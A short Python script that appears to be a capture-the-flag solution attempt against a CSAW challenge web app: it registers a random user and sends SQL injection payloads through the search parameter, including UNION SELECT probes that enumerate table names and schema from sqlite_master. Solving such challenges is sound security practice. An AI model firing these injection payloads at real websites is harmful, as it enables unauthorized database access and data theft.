import requests, re, sys, random, string, html
B="http://csale.chal.csaw.io:5000"
s=requests.Session()
u="u"+"".join(random.choice(string.ascii_lowercase) for _ in range(8))
s.post(B+"/signup",data={"username":u,"password":"pw"},timeout=20)
def q(query):
    r=s.get(B+"/",params={"q":query},timeout=20)
    return r
def show(query):
    r=q(query)
    t=r.text
    if "Search failed" in t: print("FAILED:",query[:80]); return
    cards=re.findall(r'<article class="card">(.*?)</article>', t, re.S)
    print("OK", len(cards), "cards for", query[:70])
    for c in cards[:20]:
        ttl=re.search(r'<h3>(.*?)</h3>',c,re.S)
        desc=re.search(r'<p>(.*?)</p>',c,re.S)
        own=re.search(r'<small>(.*?)</small>',c,re.S)
        print("   T:",html.unescape(ttl.group(1)) if ttl else None,"| O:",html.unescape(own.group(1)) if own else None,"| D:",html.unescape(desc.group(1))[:120] if desc else None)
if __name__=="__main__":
    print("user",u)
    show("")
    show("'")
    show("' UNION SELECT 1,2,3,4,5,6,7--")
    show("' UNION SELECT 1,name,3,4,5,6,7 FROM sqlite_master--")
    show("' UNION SELECT 1,sql,3,4,5,6,7 FROM sqlite_master--")
